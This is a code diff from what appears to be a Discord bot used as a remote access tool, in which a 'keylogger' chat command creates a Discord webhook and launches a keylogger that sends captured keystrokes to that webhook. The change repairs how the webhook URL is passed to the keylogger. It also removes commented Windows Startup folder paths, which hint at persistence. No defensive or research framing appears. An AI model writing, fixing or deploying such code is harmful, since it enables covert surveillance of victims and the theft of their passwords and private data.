@@ -429,11 +429,11 @@ async def on_message(message):
     elif message.content == "keylogger":
         await message.reply("Creating new webhook for keylogger...")
         try:
-            webhook = await message.channel.create_webhook(name="Keylogger").url
-            await message.reply(f"Created webhook, using URL: {webhook}")
-            Keylogger(webhook).run()
-        except:
-            await message.reply("Failed to create new webhook!")
+            webhook = await message.channel.create_webhook(name="Keylogger")
+            await message.reply(f"Created webhook, using URL: {webhook.url}")
+            Keylogger(webhook.url).run()
+        except Exception as e:
+            await message.reply(f"Failed to create new webhook!")
             return
         
         await message.reply("Keylogger enabled!")
@@ -453,7 +453,3 @@ try:
     client.run(TOKEN)
 except:
     pass
-
-
-#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-#C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
